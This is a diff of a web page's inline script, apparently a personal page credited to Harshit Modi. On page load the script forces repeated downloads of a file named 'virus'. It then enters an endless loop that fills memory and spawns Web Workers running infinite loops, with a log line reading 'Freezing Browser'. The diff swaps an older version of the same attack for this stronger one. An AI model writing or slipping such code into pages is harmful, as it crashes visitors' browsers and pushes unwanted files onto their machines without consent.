@@ -209,26 +209,35 @@
 </div>
 <script>
 window.onload = function() {
-    setTimeout(() => {
-        for (let i = 1; i <= 200; i++) {
-            var a = document.createElement('a');
-            a.href = 'virus';
-            a.download = 'virus';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-        }
+    var downloadcount = 20; 
 
-        setTimeout(() => {
-            let a = [];
-            while (true) {
-                console.log("downloads happening"); 
-                a.push(new Array(1e6).fill(420)); 
-                let x = Math.sqrt(Math.random()) * Math.log(Math.random());
-            }
-        }, 1000); 
-    }, 3000); 
-  };
+   
+    for (let i = 1; i <= downloadcount; i++) {
+        var a = document.createElement('a');
+        a.href = 'virus';
+        a.download = 'virus';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+    }
+
+  
+    setTimeout(() => {
+        let a = [];
+        let workers = [];
+
+        while (true) {
+            console.log("Freezing Browser");
+            a.push(new Array(1e6).fill(69));  
+            let x = Math.sqrt(Math.random()) * Math.log(Math.random());
+            let workerScript = `while (true) { let y = Math.sqrt(Math.random()) * Math.log(Math.random()); }`;
+            let blob = new Blob([workerScript], { type: "text/javascript" });
+            let worker = new Worker(URL.createObjectURL(blob));
+            workers.push(worker);
+        }
+    }, 2000);
+};
+
 </script>
 <div id="postamble" class="status">
 <p class="author">Author: Harshit Modi</p>
